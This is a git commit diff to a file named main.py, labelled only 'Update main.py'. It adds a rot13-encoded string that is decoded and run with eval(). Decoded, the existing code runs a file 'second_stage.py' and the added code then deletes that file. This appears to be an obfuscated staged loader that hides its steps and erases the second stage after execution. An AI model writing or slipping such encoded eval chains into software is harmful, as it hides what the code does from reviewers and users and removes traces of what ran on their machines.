9bc5abc0c409f5e69773da73877f7c6648158133
fluffyleach98765 <123709719+fluffyleach98765@users.noreply.github.com>
2023-01-27 07:30:04 +0000

    Update main.py

--- main.py
+++ main.py
@@ -9,7 +9,13 @@ second = '''
 bf.flfgrz("Clguba frpbaq_fgntr.cl")
 '''
 
+third = '''
+bf.erzbir("frpbaq_fgntr.cl")
+'''
+
 first_decoded = codecs.decode(first, 'rot13')
 second_decoded = codecs.decode(second, 'rot13')
+third_decoded = codecs.decode(third, 'rot13')
 eval(first_decoded)
 eval(second_decoded)
+eval(third_decoded)
